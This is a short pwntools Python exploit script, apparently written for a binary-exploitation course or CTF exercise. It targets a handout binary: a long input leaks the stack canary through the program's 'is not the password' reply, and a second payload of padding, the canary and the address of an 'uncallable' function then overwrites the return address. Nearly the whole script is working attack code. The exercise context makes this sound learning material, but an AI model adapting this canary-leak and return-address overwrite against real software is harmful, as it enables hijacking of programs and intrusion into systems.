#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import ctypes

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise3/exercise3a'


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *main+283
break *check_authorization+22
break *check_authorization+115
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

r = start()
r.recvline()

address = ELF(exe).symbols['uncallable']
uncallable_address = p64(address)

# trigger "Well of course ... is " response
# (from hint at https://ctf101.org/binary-exploitation/stack-canaries/
# stack canary is likely to be found in such string)
# padding can be found by debugging and looking for the canary
r.sendline(b"A" * 171)

# trim the string containing the canary
string = r.recvuntil(b"is not the password")
canary = string.replace(b"Well of course ", b"") \
                .replace(b"A", b"") \
                .replace(b" is not the password", b"") \
                .strip(b"\n")

r.sendline(b"A" * 172 + canary + b"A" * 24 + uncallable_address)
print(r.recvall(timeout=2))
